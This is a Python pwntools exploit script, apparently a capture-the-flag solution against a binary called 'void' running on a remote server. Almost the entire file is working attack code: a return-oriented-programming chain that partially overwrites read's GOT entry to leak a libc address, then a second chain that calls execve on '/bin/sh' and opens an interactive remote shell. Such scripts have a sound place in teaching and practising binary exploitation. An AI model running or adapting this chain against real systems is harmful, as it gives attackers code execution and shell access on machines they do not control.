from pwn import *

context.binary = "./void"
padding = b'A'*72

io = remote("165.232.108.240",30338)

poprsir15 = p64(0x00000000004011b9)
read = p64(0x00401030)
vuln = p64(0x00401122)
ret = p64(0x0000000000401016)
re_resolve_read = p64(0x00401036)
poprdi = p64(0x00000000004011bb)



payload = [
    #Overwrite LSB so read becomes syscall
    padding,
    poprsir15,
    p64(0x404018),
    p64(0xdeadbeef),
    read,
    #Leak the GOT. RAX is already 1
    poprsir15,
    p64(0x404018),
    p64(0xdeadbeef),
    poprdi,
    p64(0x1),
    read,
    #Resolve read back to being read again
    poprdi,
    p64(0x0),
    re_resolve_read,
    vuln
]
payload = b''.join(payload)
sleep(0.1)
io.send(payload)
sleep(0.1)
io.send(b'\x8c')
sleep(0.1)
io.send(b'\x80')

#Receive leak
leak = u64(io.recv(8))
libc_base = leak-0xec78c
print(f"LIBC BASE {libc_base:#x}")


#Spawn shell
poprsi = p64(libc_base+0x000000000002590f)
poprdx = p64(libc_base+0x00000000000c8acd)
poprax = p64(libc_base+0x000000000003be88)
syscall = p64(libc_base+0x00000000000550da)
binsh = p64(libc_base+0x00196152)


payload = [
    padding,
    poprdi,
    binsh,
    poprsi,
    p64(0),
    poprdx,
    p64(0),
    poprax,
    p64(59),
    syscall
]

payload = b''.join(payload)
sleep(0.1)
io.send(payload)


io.interactive()